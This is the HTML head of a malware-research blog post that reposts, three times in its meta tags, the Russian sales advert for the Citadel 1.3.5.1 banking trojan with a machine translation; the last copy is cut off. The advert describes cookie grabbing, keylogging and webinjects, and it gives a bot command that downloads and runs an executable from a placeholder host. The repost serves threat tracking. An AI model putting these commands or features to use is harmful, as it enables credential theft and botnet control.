@@ -1,0 +1,577 @@
+<!doctype html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Update to Citadel : 1.3.5.1 Rain Edition.</title>
+
+    <link rel="stylesheet" type="text/css" href="http://malware2.dontneedcoffee.com/assets/css/styles_feeling_responsive.css">
+
+  
+
+	<script src="http://malware2.dontneedcoffee.com/assets/js/modernizr.min.js"></script>
+
+	<script src="https://ajax.googleapis.com/ajax/libs/webfont/1.5.18/webfont.js"></script>
+	<script>
+		WebFont.load({
+			google: {
+				families: [ 'Lato:400,700,400italic:latin', 'Volkhov::latin' ]
+			}
+		});
+	</script>
+
+	<noscript>
+		<link href='http://fonts.googleapis.com/css?family=Lato:400,700,400italic%7CVolkhov' rel='stylesheet' type='text/css'>
+	</noscript>
+
+
+	<!-- Search Engine Optimization -->
+	<meta name="description" content="A new version of Citadel has been announced :&amp;nbsp;1.3.5.1 Rain Edition.Aquabox postOriginal text of the advert :&amp;nbsp;(Pastebin)Самые современные средства и инструменты для профессиональной работы собраны специально для вас в новой версии.Решены проблемы с отстуком и живучестью, работа стала еще приятнее, учтены самые важные пожелания.Взят во внимание весь опыт работы за последний сезон, новичкам будет гораздо проще работать с новой версией, чем с предыдущими.Теперь открыта в свободном доступе новая технология WebInjects для всех желающих.[+] Сделана быстрая проверка ботов на Online-статус, списком на главной странцие.[+] Возможность добавить бота в &quot;Избранное&quot; без отчетов.[+] Сделано детектирование привилегий в системе(admin/user), отображается в &quot;Информация о боте: [Флаги]&quot;[+] Сортировка скриншотов по дате.[+] Добавлена возможность подключения других БД Citadel (как удаленные БД, так и старые/отключенные админки) для поиска отчетов.[+] Расширен поиск в БД: можно указывать стоп-слова, например twitter.com, которые будут отсутствовать при выдаче результатов, чтобы не засорять логи мусором. Также, можно указать поиск не по содержимому отчета, а по URL Mask, это увеличивает скорость поиска данных.[+] Расширен Jabber уведомитель, добавлены следущие события:- Маски BotID на событие &quot;Бот вышел в Online&quot;- Уведомление при обнаружении конкретного ПО из &quot;installed software&quot;- Маска на содержимое CMD отчета.- Параллельная удобная запись в log-файл всех событий, помимо Jabber-уведомлений.[+] Добавлен бесплатный модуль граббинга кукисов в Firefox, экспортирует все cookies из браузера и отсылает вам.[+] Исправлена ошибка удаления отчетов.[+] Авто-обновление статистики главной страницы.[+] Кнопка [Decode] на отчетах, которая позволяет декодировать urlencode(%0D) последовательности в удобный вид.[+] Добавлена возможность определения online/offline статуса у бота в API.[+] Полностью переделан алгоритм проверки в модуле WebSocks.[+] Отображение скриптов(команд) постранично.[+] Добавлена возможность отсылки сообщений на jabber через api.php (использует ваши персональные настройки в админке)[+] Теперь при каждом HTTP/HTTPS отчете, добавляются cookies(Firefox/IE), а также заголовки:&amp;nbsp;[+] Полностью переделан внутренний алгоритм шифрования, отстук во много раз выше, живучесть дольше. Для переноса ботов на новую версию, выполняем команду user_execute&amp;nbsp;http://www.host.com/1351.exe. RC4 ключ должен совпадать.[+] Корректировка Browser Keylogger&#39;a. Автоматически добавляются пробел, если с момента последнего нажатия клавиши прошло 5 секунд, необходимо для визуального разделения input-полей.[+] Исправлен недочет с 302 редиректом, когда не срабатывал инжект, если осуществлялся переход по ссылке через javascript.[+] Plaintext логи открываются в новой вкладке.[+] Исправлена ошибка пропадания ботов из онлайна при включенном GeoIP.[+] Отображение комментария к боту в VNC-модуле при наведении мышки, а также отсылка комментария в jabber вместе с информацией о коннекте.[+] Возможность указать в DnsFilters(перенаправление траффика) маски со звездочками (*), можно сделать маску более гибкой.[+] WebInjects. Модуль разработан для быстрого взаимодействия с холдером через технологию инжектов в браузеры. Модуль позволяет прогрузить любые инжекты конкретному BotID, стране или ботнету всего лишь за несколько минут, без редактирования конфига. Модуль работает через админку.Краткий ликбез:В конфиге бота, секция DynamicConfig, вписывается параметр url_webinjects &quot;http://www.host.com/file.php&quot; (путь до file.php). Бот дергает этот файл раз в 2 минуты, забирая оттуда пачку инжектов, которую выдает распределения система выдачи инжектов.В разделе ВебИнжекты существуют 2 секции: &quot;Группа вебинжектов&quot; и &quot;Паки&quot;, первая имеет структуру &quot;Группа - Инжекты - Пользователи(допущенные к группе)&quot; и отвечает за управление всеми инжектами. Вторая секция отвечает за настройку распространения инжектов(каким ботам доставляем инжекты и в каком количестве).В главном меню, вразделе &quot;Пользователи&quot;, при создании нового пользователя, есть права &quot;r_botnet_webinjects_coder&quot; это пользователь, который может управлять группой, привилегии которого назначит администратор. Иначе говоря, если вы допустите разработчика инжектов в админку и создадите ему аккаунт, то у него будут права создавать свои инжекты и редактировать их, чужие инжекты он не видит, отображается только своя группа списка инжектов. Т.е вы можете создать 5 групп и создать 5 инжект-кодеров, таким образом каждый человек отвечает за свою группу(набор инжектов). Вы смотрите в статистике что происходит в общей системе и можете объеденять все группы инжектов в один &quot;пак&quot;, который будет прогружен всем без исключения ботам, либо отдельно взятой категории ботов по классу: страна или ботнет.В админке создан специальный удобный визуальный редактор инжектов с подсветкой синтаксиса. Формат полностью совместим с зевсоформатом.Сушествует несколько режимов для паков.Dual - когда работает файл с инжектами из основного конфига + вебинжекты.Single - когда работают только вебинжекты, а локальный файл с инжектами отключается.Disabled - когда вебинжекты отключены, а локальный файл с инжектами работает.Если случайно была допущена ошибка где-то в инжекте, то вебинжекты не соберутся и вам придет DEBUG-отчет с информацией, какой пак(bundle) не был собран.В информации по боту, можно посмотреть историю прогрузки веб-инжектов, также, можно поискать DEBUG-отчеты по боту и посмотреть историю компиляций и ошибок вебинжектов.Если бот получает сразу несколько паков(бандлов) где разные режимы работы: dual, single, disabled то из всех бандлов выбирается автоматически самый &quot;узкий режим&quot; работы, например single.Бот постоянно сверяет наличие обновления любого из вебинжектов, и если таковое имеется, то он его обновляет у себя.&amp;nbsp;[+] Опция в конфиге disable_httpgrabber расширена и позволяет полностью избавиться от HTTP-отчетов, отправляя на сервер только HTTPS-отчеты со всех браузеров, если установлено значение &quot;1&quot;. Избавьтесь от лишней нагрузки на сервер.[+] Добавлена секция &quot;HttpVipUrls&quot; в WebFilters, которая позволяет добавлять ссылки-исключения(http://) при отсутствии HTTP-граббинга (disable_httpgrabber 1).&amp;nbsp;[+] Полностью перереботан мануал, теперь удобная навигация + раскрыты некоторые тонкости работы, а также добавлены ответы на популярные вопросы, с примерами. Изменено лицензионное соглашение, которое содержится в мануале.Для получения новой версии, размещаем заявку в Jabber&#39;e в таком формате: &quot;&amp;lt;login в CRM&amp;gt; размещаю заявку на получение новой версии&quot;. Оплата поддержки должна быть своевременной, те, у кого задолжность более 3 месяцев - новую версию&amp;nbsp;не&amp;nbsp;получают. Срок выдачи от 3 до 72 часов. Если у вас имеется лицензированный партнер или саппорт, сразу пишите об этом в заявке до выдачи, а не после.Для старых клиентов, обновление включено в абонентскую плату, для новых, цена базовой комплектации составляет теперь&amp;nbsp;$3931.00Jabber для покупки и обновлений:&amp;nbsp;aquabox@lugmen.org.arСаппорт в праве отказать в продаже лицензии без объяснения причины. Поддержка клиентов на уровне сложных технических вопросов отменена из-за большого количества, обменивайтесь опытом с коллегами через CRM либо форумы.---------------------------------- Google Translation :&amp;nbsp;(Pastebin) - (if you want to correct this raw&amp;nbsp;google translation, drop a comment or DM on Twitter&amp;nbsp;)The latest tools and tools for professional work collected for you in the new version.Fixed problems with otstuk and vitality, work has become more pleasant, considered the most important requirements.Taken into account the whole experience last season, beginners will be much easier to work with the new version than the previous ones.Is now open for free access WebInjects new technology to the public.[+] Did a quick check of bots on Online-status on the main list of page.[+] Ability to add bot in the &quot;Favorites&quot; without reporting.[+] Made detection system privileges (admin / user), is displayed in the &quot;Information on bot [flags]&quot;[+] Sort by date screenshots.[+] Added ability to connect to other databases Citadel (as remote database, and old / disabled admin) to search for reports.[+] Expand your search in the database: you can specify the stop words, such as twitter.com, which will not appear in the issuance of the results, not to litter logging debris. Also, you can specify the contents of the search does not report, and for URL Mask, it increases the speed of data retrieval.[+] Enhanced Jabber notifier added Next event:- Masks BotID the event &quot;Boat reached the Online&quot;- Be notified when a specific software from the &quot;installed software&quot;- Mask to the contents of the report CMD.- Parallel convenient entry in the log-file of all events, in addition to Jabber-notifications.[+] Added a free module of grabbing cookies in Firefox, exports all the cookies from the browser and sends you.[+] Fixed delete reports.[+] Auto-Update Statistics homepage.[+] Button [Decode] on the reports, which can decode urlencode (% 0D) sequences in a convenient form.[+] Added the ability to determine the online / offline status of the bot in the API.[+] Completely reworked the algorithm checks the module WebSocks.[+] Show scripts (commands) by page.[+] Added ability to send messages to a jabber api.php (uses your personal settings in the admin)[+] Now, every HTTP / HTTPS report added cookies (Firefox / IE), as well as headlines:[+] Completely redesigned internal encryption algorithm otstuk many times higher, longer survival. You need to migrate to the new version, run the command user_execute http://www.host.com/1351.exe. RC4 key must match.[+] Adjust Browser Keylogger&#39;a. Automatically adds a space if after the last key press was 5 seconds, you need to visually separate input-fields.[+] Fixed an issue with a 302 redirect, did not work when inject, if you are following a link via javascript.[+] Plaintext logs will open in a new tab.[+] Fixed bots failure of the online when the GeoIP.[+] Display the comment to the boat in the VNC-module by the mouse, as well as sending a comment to jabber with information about a connection.[+] Ability to specify DnsFilters (redirect traffic) mask with an asterisk (*), you can make the mask more flexible.[+] WebInjects. The module is designed for easy interaction with Holder through technology injected into browsers. The module allows any progruzit inject specific BotID, country or botnet in just a few minutes, without having to edit the config. The module works through the admin panel.Brief educational program:In config bot section DynamicConfig, fit parameter url_webinjects &quot;http://www.host.com/file.php&quot; (path to file.php). Boat pulls the file every 2 minutes, taking out a packet injector, which gives the distribution of the system of granting the injector.From there VebInzhekty 2 sections: &quot;The group vebinzhektov&quot; and &quot;Paki&quot;, the first is the structure of &quot;group - injected - Members (admitted to the group),&quot; and is responsible for managing all of the injector. The second section is responsible for setting the spread of the injector (which deliver bots inject and how much).In the main menu, vrazdele &quot;Users&quot;, creating a new user has rights &quot;r_botnet_webinjects_coder&quot; is a user who can manage the group, which will appoint an administrator privileges. In other words, if you make a developer injected in admin account and create it, it will have the right to form their own injector and edit them, others injected he sees only displays a list of his own group injected. Ie you can create 5 groups and create a 5-coders inject, so each person is responsible for their group (set injector). You see the statistics of what happens in the overall system and can unites all groups injected into one &quot;pack&quot;, which will be progruzhen any and all bots, or a single category of boats in the class: a country or a botnet.In the admin area, a special convenient visual editor injected with syntax highlighting. Format is fully compatible with zevsoformatom.Image do several modes for packs.Dual - when running a file with injected from the main config + vebinzhekty.Single - when only vebinzhekty, and the local file with the injector is switched off.Disabled - when vebinzhekty disabled, and local file with injector works.If you accidentally make a mistake somewhere in the injector, the vebinzhekty be gathered together and you have to DEBUG-report with information which pack (bundle) was not assembled.The information on the boat, you can see the history of injection test web injected, also, you can search DEBUG-bot reports and look at the history and compilation errors vebinzhektov.If the bot receives several packs (bundles) where different modes of operation: dual, single, disabled then all Bandlov automatically selected the most &quot;narrow mode&quot;, such as single.Boat constantly checks for updates of any vebinzhektov, and if so, then it updates its host.[+] Option in the config disable_httpgrabber expanded and allows to get rid of HTTP-reports sent to the server HTTPS-only reports on all browsers, if set to &quot;1&quot;. Get rid of the extra load on the server.[+] Added the section &quot;HttpVipUrls&quot; in WebFilters, which allows you to add links-exclusion (http://) in the absence of HTTP-grabbing (disable_httpgrabber 1).[+] Fully pererebotan manual now easy navigation + revealed some details of the work, and also added the answers to frequently asked questions, with examples. Changed the license agreement, which is contained in the manual.To get the new version, place a request in Jabber&#39;e in this format: &quot;&amp;lt;login CRM&amp;gt; in place an application for a new version.&quot; Payment of support must be timely, those with debts of more than 3 months - do not get the new version. Term delivery from 3 to 72 hours. If you have a licensed partner or a support, just write it in the application to the issue, and not after.For existing customers, the update is included in the monthly fee for the new price of the basic configuration is now $ 3931.00Jabber for purchases and upgrades: aquabox@lugmen.org.arA support of the right to refuse the sale of a license without giving a reason. Customer support at the level of the complex technical issues canceled due to the number, share experience with colleagues through CRM or forums.---------------------------------- Looking for a sample &amp;nbsp;?91b64502a89d6c47d1adbde3ebbf2532&amp;nbsp;Want to read more ?Inside Citadel 1.3.4.5 C&amp;amp;C &amp;amp; Builder - Botnet Control Panel&amp;nbsp;- 2012-07-29Update to Citadel : v.1.3.4.5&amp;nbsp;- 2012-06-11Update to Citadel : v1.3.3.5&amp;nbsp;- 2012-04-03">
+  	
+	
+	<link rel="author" href="https://www.blogger.com/profile/16711421957420573353">
+	
+	
+	<link rel="canonical" href="http://malware2.dontneedcoffee.com/2012/10/citadelupdate1.3.5.1.html">
+
+
+	<!-- Facebook Open Graph -->
+	<meta property="og:title" content="Update to Citadel : 1.3.5.1 Rain Edition.">
+	<meta property="og:description" content="A new version of Citadel has been announced :&amp;nbsp;1.3.5.1 Rain Edition.Aquabox postOriginal text of the advert :&amp;nbsp;(Pastebin)Самые современные средства и инструменты для профессиональной работы собраны специально для вас в новой версии.Решены проблемы с отстуком и живучестью, работа стала еще приятнее, учтены самые важные пожелания.Взят во внимание весь опыт работы за последний сезон, новичкам будет гораздо проще работать с новой версией, чем с предыдущими.Теперь открыта в свободном доступе новая технология WebInjects для всех желающих.[+] Сделана быстрая проверка ботов на Online-статус, списком на главной странцие.[+] Возможность добавить бота в &quot;Избранное&quot; без отчетов.[+] Сделано детектирование привилегий в системе(admin/user), отображается в &quot;Информация о боте: [Флаги]&quot;[+] Сортировка скриншотов по дате.[+] Добавлена возможность подключения других БД Citadel (как удаленные БД, так и старые/отключенные админки) для поиска отчетов.[+] Расширен поиск в БД: можно указывать стоп-слова, например twitter.com, которые будут отсутствовать при выдаче результатов, чтобы не засорять логи мусором. Также, можно указать поиск не по содержимому отчета, а по URL Mask, это увеличивает скорость поиска данных.[+] Расширен Jabber уведомитель, добавлены следущие события:- Маски BotID на событие &quot;Бот вышел в Online&quot;- Уведомление при обнаружении конкретного ПО из &quot;installed software&quot;- Маска на содержимое CMD отчета.- Параллельная удобная запись в log-файл всех событий, помимо Jabber-уведомлений.[+] Добавлен бесплатный модуль граббинга кукисов в Firefox, экспортирует все cookies из браузера и отсылает вам.[+] Исправлена ошибка удаления отчетов.[+] Авто-обновление статистики главной страницы.[+] Кнопка [Decode] на отчетах, которая позволяет декодировать urlencode(%0D) последовательности в удобный вид.[+] Добавлена возможность определения online/offline статуса у бота в API.[+] Полностью переделан алгоритм проверки в модуле WebSocks.[+] Отображение скриптов(команд) постранично.[+] Добавлена возможность отсылки сообщений на jabber через api.php (использует ваши персональные настройки в админке)[+] Теперь при каждом HTTP/HTTPS отчете, добавляются cookies(Firefox/IE), а также заголовки:&amp;nbsp;[+] Полностью переделан внутренний алгоритм шифрования, отстук во много раз выше, живучесть дольше. Для переноса ботов на новую версию, выполняем команду user_execute&amp;nbsp;http://www.host.com/1351.exe. RC4 ключ должен совпадать.[+] Корректировка Browser Keylogger&#39;a. Автоматически добавляются пробел, если с момента последнего нажатия клавиши прошло 5 секунд, необходимо для визуального разделения input-полей.[+] Исправлен недочет с 302 редиректом, когда не срабатывал инжект, если осуществлялся переход по ссылке через javascript.[+] Plaintext логи открываются в новой вкладке.[+] Исправлена ошибка пропадания ботов из онлайна при включенном GeoIP.[+] Отображение комментария к боту в VNC-модуле при наведении мышки, а также отсылка комментария в jabber вместе с информацией о коннекте.[+] Возможность указать в DnsFilters(перенаправление траффика) маски со звездочками (*), можно сделать маску более гибкой.[+] WebInjects. Модуль разработан для быстрого взаимодействия с холдером через технологию инжектов в браузеры. Модуль позволяет прогрузить любые инжекты конкретному BotID, стране или ботнету всего лишь за несколько минут, без редактирования конфига. Модуль работает через админку.Краткий ликбез:В конфиге бота, секция DynamicConfig, вписывается параметр url_webinjects &quot;http://www.host.com/file.php&quot; (путь до file.php). Бот дергает этот файл раз в 2 минуты, забирая оттуда пачку инжектов, которую выдает распределения система выдачи инжектов.В разделе ВебИнжекты существуют 2 секции: &quot;Группа вебинжектов&quot; и &quot;Паки&quot;, первая имеет структуру &quot;Группа - Инжекты - Пользователи(допущенные к группе)&quot; и отвечает за управление всеми инжектами. Вторая секция отвечает за настройку распространения инжектов(каким ботам доставляем инжекты и в каком количестве).В главном меню, вразделе &quot;Пользователи&quot;, при создании нового пользователя, есть права &quot;r_botnet_webinjects_coder&quot; это пользователь, который может управлять группой, привилегии которого назначит администратор. Иначе говоря, если вы допустите разработчика инжектов в админку и создадите ему аккаунт, то у него будут права создавать свои инжекты и редактировать их, чужие инжекты он не видит, отображается только своя группа списка инжектов. Т.е вы можете создать 5 групп и создать 5 инжект-кодеров, таким образом каждый человек отвечает за свою группу(набор инжектов). Вы смотрите в статистике что происходит в общей системе и можете объеденять все группы инжектов в один &quot;пак&quot;, который будет прогружен всем без исключения ботам, либо отдельно взятой категории ботов по классу: страна или ботнет.В админке создан специальный удобный визуальный редактор инжектов с подсветкой синтаксиса. Формат полностью совместим с зевсоформатом.Сушествует несколько режимов для паков.Dual - когда работает файл с инжектами из основного конфига + вебинжекты.Single - когда работают только вебинжекты, а локальный файл с инжектами отключается.Disabled - когда вебинжекты отключены, а локальный файл с инжектами работает.Если случайно была допущена ошибка где-то в инжекте, то вебинжекты не соберутся и вам придет DEBUG-отчет с информацией, какой пак(bundle) не был собран.В информации по боту, можно посмотреть историю прогрузки веб-инжектов, также, можно поискать DEBUG-отчеты по боту и посмотреть историю компиляций и ошибок вебинжектов.Если бот получает сразу несколько паков(бандлов) где разные режимы работы: dual, single, disabled то из всех бандлов выбирается автоматически самый &quot;узкий режим&quot; работы, например single.Бот постоянно сверяет наличие обновления любого из вебинжектов, и если таковое имеется, то он его обновляет у себя.&amp;nbsp;[+] Опция в конфиге disable_httpgrabber расширена и позволяет полностью избавиться от HTTP-отчетов, отправляя на сервер только HTTPS-отчеты со всех браузеров, если установлено значение &quot;1&quot;. Избавьтесь от лишней нагрузки на сервер.[+] Добавлена секция &quot;HttpVipUrls&quot; в WebFilters, которая позволяет добавлять ссылки-исключения(http://) при отсутствии HTTP-граббинга (disable_httpgrabber 1).&amp;nbsp;[+] Полностью перереботан мануал, теперь удобная навигация + раскрыты некоторые тонкости работы, а также добавлены ответы на популярные вопросы, с примерами. Изменено лицензионное соглашение, которое содержится в мануале.Для получения новой версии, размещаем заявку в Jabber&#39;e в таком формате: &quot;&amp;lt;login в CRM&amp;gt; размещаю заявку на получение новой версии&quot;. Оплата поддержки должна быть своевременной, те, у кого задолжность более 3 месяцев - новую версию&amp;nbsp;не&amp;nbsp;получают. Срок выдачи от 3 до 72 часов. Если у вас имеется лицензированный партнер или саппорт, сразу пишите об этом в заявке до выдачи, а не после.Для старых клиентов, обновление включено в абонентскую плату, для новых, цена базовой комплектации составляет теперь&amp;nbsp;$3931.00Jabber для покупки и обновлений:&amp;nbsp;aquabox@lugmen.org.arСаппорт в праве отказать в продаже лицензии без объяснения причины. Поддержка клиентов на уровне сложных технических вопросов отменена из-за большого количества, обменивайтесь опытом с коллегами через CRM либо форумы.---------------------------------- Google Translation :&amp;nbsp;(Pastebin) - (if you want to correct this raw&amp;nbsp;google translation, drop a comment or DM on Twitter&amp;nbsp;)The latest tools and tools for professional work collected for you in the new version.Fixed problems with otstuk and vitality, work has become more pleasant, considered the most important requirements.Taken into account the whole experience last season, beginners will be much easier to work with the new version than the previous ones.Is now open for free access WebInjects new technology to the public.[+] Did a quick check of bots on Online-status on the main list of page.[+] Ability to add bot in the &quot;Favorites&quot; without reporting.[+] Made detection system privileges (admin / user), is displayed in the &quot;Information on bot [flags]&quot;[+] Sort by date screenshots.[+] Added ability to connect to other databases Citadel (as remote database, and old / disabled admin) to search for reports.[+] Expand your search in the database: you can specify the stop words, such as twitter.com, which will not appear in the issuance of the results, not to litter logging debris. Also, you can specify the contents of the search does not report, and for URL Mask, it increases the speed of data retrieval.[+] Enhanced Jabber notifier added Next event:- Masks BotID the event &quot;Boat reached the Online&quot;- Be notified when a specific software from the &quot;installed software&quot;- Mask to the contents of the report CMD.- Parallel convenient entry in the log-file of all events, in addition to Jabber-notifications.[+] Added a free module of grabbing cookies in Firefox, exports all the cookies from the browser and sends you.[+] Fixed delete reports.[+] Auto-Update Statistics homepage.[+] Button [Decode] on the reports, which can decode urlencode (% 0D) sequences in a convenient form.[+] Added the ability to determine the online / offline status of the bot in the API.[+] Completely reworked the algorithm checks the module WebSocks.[+] Show scripts (commands) by page.[+] Added ability to send messages to a jabber api.php (uses your personal settings in the admin)[+] Now, every HTTP / HTTPS report added cookies (Firefox / IE), as well as headlines:[+] Completely redesigned internal encryption algorithm otstuk many times higher, longer survival. You need to migrate to the new version, run the command user_execute http://www.host.com/1351.exe. RC4 key must match.[+] Adjust Browser Keylogger&#39;a. Automatically adds a space if after the last key press was 5 seconds, you need to visually separate input-fields.[+] Fixed an issue with a 302 redirect, did not work when inject, if you are following a link via javascript.[+] Plaintext logs will open in a new tab.[+] Fixed bots failure of the online when the GeoIP.[+] Display the comment to the boat in the VNC-module by the mouse, as well as sending a comment to jabber with information about a connection.[+] Ability to specify DnsFilters (redirect traffic) mask with an asterisk (*), you can make the mask more flexible.[+] WebInjects. The module is designed for easy interaction with Holder through technology injected into browsers. The module allows any progruzit inject specific BotID, country or botnet in just a few minutes, without having to edit the config. The module works through the admin panel.Brief educational program:In config bot section DynamicConfig, fit parameter url_webinjects &quot;http://www.host.com/file.php&quot; (path to file.php). Boat pulls the file every 2 minutes, taking out a packet injector, which gives the distribution of the system of granting the injector.From there VebInzhekty 2 sections: &quot;The group vebinzhektov&quot; and &quot;Paki&quot;, the first is the structure of &quot;group - injected - Members (admitted to the group),&quot; and is responsible for managing all of the injector. The second section is responsible for setting the spread of the injector (which deliver bots inject and how much).In the main menu, vrazdele &quot;Users&quot;, creating a new user has rights &quot;r_botnet_webinjects_coder&quot; is a user who can manage the group, which will appoint an administrator privileges. In other words, if you make a developer injected in admin account and create it, it will have the right to form their own injector and edit them, others injected he sees only displays a list of his own group injected. Ie you can create 5 groups and create a 5-coders inject, so each person is responsible for their group (set injector). You see the statistics of what happens in the overall system and can unites all groups injected into one &quot;pack&quot;, which will be progruzhen any and all bots, or a single category of boats in the class: a country or a botnet.In the admin area, a special convenient visual editor injected with syntax highlighting. Format is fully compatible with zevsoformatom.Image do several modes for packs.Dual - when running a file with injected from the main config + vebinzhekty.Single - when only vebinzhekty, and the local file with the injector is switched off.Disabled - when vebinzhekty disabled, and local file with injector works.If you accidentally make a mistake somewhere in the injector, the vebinzhekty be gathered together and you have to DEBUG-report with information which pack (bundle) was not assembled.The information on the boat, you can see the history of injection test web injected, also, you can search DEBUG-bot reports and look at the history and compilation errors vebinzhektov.If the bot receives several packs (bundles) where different modes of operation: dual, single, disabled then all Bandlov automatically selected the most &quot;narrow mode&quot;, such as single.Boat constantly checks for updates of any vebinzhektov, and if so, then it updates its host.[+] Option in the config disable_httpgrabber expanded and allows to get rid of HTTP-reports sent to the server HTTPS-only reports on all browsers, if set to &quot;1&quot;. Get rid of the extra load on the server.[+] Added the section &quot;HttpVipUrls&quot; in WebFilters, which allows you to add links-exclusion (http://) in the absence of HTTP-grabbing (disable_httpgrabber 1).[+] Fully pererebotan manual now easy navigation + revealed some details of the work, and also added the answers to frequently asked questions, with examples. Changed the license agreement, which is contained in the manual.To get the new version, place a request in Jabber&#39;e in this format: &quot;&amp;lt;login CRM&amp;gt; in place an application for a new version.&quot; Payment of support must be timely, those with debts of more than 3 months - do not get the new version. Term delivery from 3 to 72 hours. If you have a licensed partner or a support, just write it in the application to the issue, and not after.For existing customers, the update is included in the monthly fee for the new price of the basic configuration is now $ 3931.00Jabber for purchases and upgrades: aquabox@lugmen.org.arA support of the right to refuse the sale of a license without giving a reason. Customer support at the level of the complex technical issues canceled due to the number, share experience with colleagues through CRM or forums.---------------------------------- Looking for a sample &amp;nbsp;?91b64502a89d6c47d1adbde3ebbf2532&amp;nbsp;Want to read more ?Inside Citadel 1.3.4.5 C&amp;amp;C &amp;amp; Builder - Botnet Control Panel&amp;nbsp;- 2012-07-29Update to Citadel : v.1.3.4.5&amp;nbsp;- 2012-06-11Update to Citadel : v1.3.3.5&amp;nbsp;- 2012-04-03">
+	<meta property="og:url" content="http://malware2.dontneedcoffee.com/2012/10/citadelupdate1.3.5.1.html">
+	<meta property="og:locale" content="en_EN">
+	<meta property="og:type" content="website">
+	<meta property="og:site_name" content="MDNC | Malware don't need Coffee">
+	
+	
+
+
+	
+	<!-- Twitter -->
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:site" content="Kafeine">
+	<meta name="twitter:creator" content="Kafeine">
+	<meta name="twitter:title" content="Update to Citadel : 1.3.5.1 Rain Edition.">
+	<meta name="twitter:description" content="A new version of Citadel has been announced :&amp;nbsp;1.3.5.1 Rain Edition.Aquabox postOriginal text of the advert :&amp;nbsp;(Pastebin)Самые современные средства и инструменты для профессиональной работы собраны специально для вас в новой версии.Решены проблемы с отстуком и живучестью, работа стала еще приятнее, учтены самые важные пожелания.Взят во внимание весь опыт работы за последний сезон, новичкам будет гораздо проще работать с новой версией, чем с предыдущими.Теперь открыта в свободном доступе новая технология WebInjects для всех желающих.[+] Сделана быстрая проверка ботов на Online-статус, списком на главной странцие.[+] Возможность добавить бота в &quot;Избранное&quot; без отчетов.[+] Сделано детектирование привилегий в системе(admin/user), отображается в &quot;Информация о боте: [Флаги]&quot;[+] Сортировка скриншотов по дате.[+] Добавлена возможность подключения других БД Citadel (как удаленные БД, так и старые/отключенные админки) для поиска отчетов.[+] Расширен поиск в БД: можно указывать стоп-слова, например twitter.com, которые будут отсутствовать при выдаче результатов, чтобы не засорять логи мусором. Также, можно указать поиск не по содержимому отчета, а по URL Mask, это увеличивает скорость поиска данных.[+] Расширен Jabber уведомитель, добавлены следущие события:- Маски BotID на событие &quot;Бот вышел в Online&quot;- Уведомление при обнаружении конкретного ПО из &quot;installed software&quot;- Маска на содержимое CMD отчета.- Параллельная удобная запись в log-файл всех событий, помимо Jabber-уведомлений.[+] Добавлен бесплатный модуль граббинга кукисов в Firefox, экспортирует все cookies из браузера и отсылает вам.[+] Исправлена ошибка удаления отчетов.[+] Авто-обновление статистики главной страницы.[+] Кнопка [Decode] на отчетах, которая позволяет декодировать urlencode(%0D) последовательности в удобный вид.[+] Добавлена возможность определения online/offline статуса у бота в API.[+] Полностью переделан алгоритм проверки в модуле WebSocks.[+] Отображение скриптов(команд) постранично.[+] Добавлена возможность отсылки сообщений на jabber через api.php (использует ваши персональные настройки в админке)[+] Теперь при каждом HTTP/HTTPS отчете, добавляются cookies(Firefox/IE), а также заголовки:&amp;nbsp;[+] Полностью переделан внутренний алгоритм шифрования, отстук во много раз выше, живучесть дольше. Для переноса ботов на новую версию, выполняем команду user_execute&amp;nbsp;http://www.host.com/1351.exe. RC4 ключ должен совпадать.[+] Корректировка Browser Keylogger&#39;a. Автоматически добавляются пробел, если с момента последнего нажатия клавиши прошло 5 секунд, необходимо для визуального разделения input-полей.[+] Исправлен недочет с 302 редиректом, когда не срабатывал инжект, если осуществлялся переход по ссылке через javascript.[+] Plaintext логи открываются в новой вкладке.[+] Исправлена ошибка пропадания ботов из онлайна при включенном GeoIP.[+] Отображение комментария к боту в VNC-модуле при наведении мышки, а также отсылка комментария в jabber вместе с информацией о коннекте.[+] Возможность указать в DnsFilters(перенаправление траффика) маски со звездочками (*), можно сделать маску более гибкой.[+] WebInjects. Модуль разработан для быстрого взаимодействия с холдером через технологию инжектов в браузеры. Модуль позволяет прогрузить любые инжекты конкретному BotID, стране или ботнету всего лишь за несколько минут, без редактирования конфига. Модуль работает через админку.Краткий ликбез:В конфиге бота, секция DynamicConfig, вписывается параметр url_webinjects &quot;http://www.host.com/file.php&quot; (путь до file.php). Бот дергает этот файл раз в 2 минуты, забирая оттуда пачку инжектов, которую выдает распределения система выдачи инжектов.В разделе ВебИнжекты существуют 2 секции: &quot;Группа вебинжектов&quot; и &quot;Паки&quot;, первая имеет структуру &quot;Группа - Инжекты - Пользователи(допущенные к группе)&quot; и отвечает за управление всеми инжектами. Вторая секция отвечает за настройку распространения инжектов(каким ботам доставляем инжекты и в каком количестве).В главном меню, вразделе &quot;Пользователи&quot;, при создании нового пользователя, есть права &quot;r_botnet_webinjects_coder&quot; это пользователь, который может управлять группой, привилегии которого назначит администратор. Иначе говоря, если вы допустите разработчика инжектов в админку и создадите ему аккаунт, то у него будут права создавать свои инжекты и редактировать их, чужие инжекты он не видит, отображается только своя группа списка инжектов. Т.е вы можете создать 5 групп и создать 5 инжект-кодеров, таким образом каждый человек отвечает за свою группу(набор инжектов). Вы смотрите в статистике что происходит в общей системе и можете объеденять все группы инжектов в один &quot;пак&quot;, который будет прогружен всем без исключения ботам, либо отдельно взятой категории ботов по классу: страна или ботнет.В админке создан специальный удобный визуальный редактор инжектов с подсветкой синтаксиса. Формат полностью совместим с зевсоформатом.Сушествует несколько режимов для паков.Dual - когда работает файл с инжектами из основного конфига + вебинжекты.Single - когда работают только вебинжекты, а локальный файл с инжектами отключается.Disabled - когда вебинжекты отключены, а локальный файл с инжектами работает.Если случайно была допущена ошибка где-то в инжекте, то вебинжекты не соберутся и вам придет DEBUG-отчет с информацией, какой пак(bundle) не был собран.В информации по боту, можно посмотреть историю прогрузки веб-инжектов, также, можно поискать DEBUG-отчеты по боту и посмотреть историю компиляций и ошибок вебинжектов.Если бот получает сразу несколько паков(бандлов) где разные режимы работы: dual, single, disabled то из всех бандлов выбирается автоматически самый &quot;узкий режим&quot; работы, например single.Бот постоянно сверяет наличие обновления любого из вебинжектов, и если таковое имеется, то он его обновляет у себя.&amp;nbsp;[+] Опция в конфиге disable_httpgrabber расширена и позволяет полностью избавиться от HTTP-отчетов, отправляя на сервер только HTTPS-отчеты со всех браузеров, если установлено значение &quot;1&quot;. Избавьтесь от лишней нагрузки на сервер.[+] Добавлена секция 